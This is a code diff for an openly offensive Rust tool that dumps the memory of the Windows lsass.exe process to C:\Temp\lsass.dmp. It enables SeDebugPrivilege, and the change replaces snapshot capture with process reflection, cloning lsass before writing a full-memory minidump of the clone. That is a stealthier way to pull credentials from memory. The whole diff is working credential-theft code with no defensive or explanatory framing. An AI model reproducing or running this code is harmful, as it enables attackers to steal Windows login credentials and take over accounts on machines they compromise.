@@ -1,11 +1,19 @@
-use std::{mem::zeroed, os::raw::c_void, ptr::null_mut};
+use std::{
+    mem::zeroed,
+    os::raw::c_void,
+    ptr::{null, null_mut},
+};
 
+use ntapi::ntrtl::{
+    RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES, RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE,
+    RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION, RtlCreateProcessReflection,
+};
 use windows_sys::{
     Wdk::System::SystemInformation::NtQuerySystemInformation,
     Win32::{
         Foundation::{
-            ERROR_NOT_ALL_ASSIGNED, GENERIC_WRITE, GetLastError, INVALID_HANDLE_VALUE,
-            STATUS_INFO_LENGTH_MISMATCH,
+            CloseHandle, ERROR_NOT_ALL_ASSIGNED, GENERIC_WRITE, GetLastError, INVALID_HANDLE_VALUE,
+            STATUS_INFO_LENGTH_MISMATCH, STATUS_SUCCESS,
         },
         Security::{
             AdjustTokenPrivileges, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES,
@@ -26,8 +34,8 @@ use windows_sys::{
                 },
             },
             Threading::{
-                GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_QUERY_INFORMATION,
-                PROCESS_VM_READ, PROCESS_VM_WRITE,
+                GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_ALL_ACCESS,
+                PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PROCESS_VM_WRITE, WaitForSingleObject,
             },
             WindowsProgramming::SYSTEM_PROCESS_INFORMATION,
         },
@@ -159,11 +167,7 @@ fn main() {
     println!("[+] SeDebugPrivilege enabled successfully");
 
     unsafe {
-        let lsass_handle = OpenProcess(
-            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
-            0,
-            pid,
-        );
+        let lsass_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
 
         if lsass_handle.is_null() {
             println!("[-] Failed to open lsass.exe process");
@@ -172,26 +176,29 @@ fn main() {
 
         println!("[+] Opened handle to lsass.exe process: {:?}", lsass_handle);
 
-        let mut snapshot: *mut c_void = null_mut();
-        let result = PssCaptureSnapshot(
-            lsass_handle,
-            PSS_CAPTURE_VA_CLONE
-                | PSS_CAPTURE_HANDLES
-                | PSS_CAPTURE_THREADS
-                | PSS_CAPTURE_THREAD_CONTEXT
-                | PSS_CREATE_BREAKAWAY_OPTIONAL,
-            0x001F_FFFF,
-            &mut snapshot,
+        let mut reflection_information = zeroed::<RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION>();
+        let status = RtlCreateProcessReflection(
+            lsass_handle as _,
+            RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE,
+            null_mut(),
+            null_mut(),
+            null_mut(),
+            &mut reflection_information,
         );
 
-        println!("[+] PssCaptureSnapshot result: {}", result);
+        CloseHandle(lsass_handle);
 
-        if result != 0 {
-            println!("[-] Failed to capture snapshot of lsass.exe process ");
+        if status != STATUS_SUCCESS && status != 0x31 {
+            println!("[-] Failed to create process reflection of lsass.exe process");
             return;
         }
 
-        println!("[+] Captured snapshot of lsass.exe process: {:?}", snapshot);
+        let pid = reflection_information.ReflectionClientId.UniqueProcess as u32;
+        let clone_handle = reflection_information.ReflectionProcessHandle;
+
+        println!("[+] Successfully cloned lsass.exe with PID: {}", pid);
+
+        WaitForSingleObject(clone_handle as _, 500);
 
         let file_handle = CreateFileA(
             "C:\\Temp\\lsass.dmp\0".as_ptr() as *const u8,
@@ -209,10 +216,10 @@ fn main() {
         }
 
         if MiniDumpWriteDump(
-            snapshot,
+            clone_handle as _,
             pid,
             file_handle,
-            MiniDumpWithFullMemory | MiniDumpWithFullMemoryInfo | MiniDumpWithThreadInfo,
+            MiniDumpWithFullMemory | MiniDumpWithFullMemoryInfo,
             null_mut(),
             null_mut(),
             null_mut(),
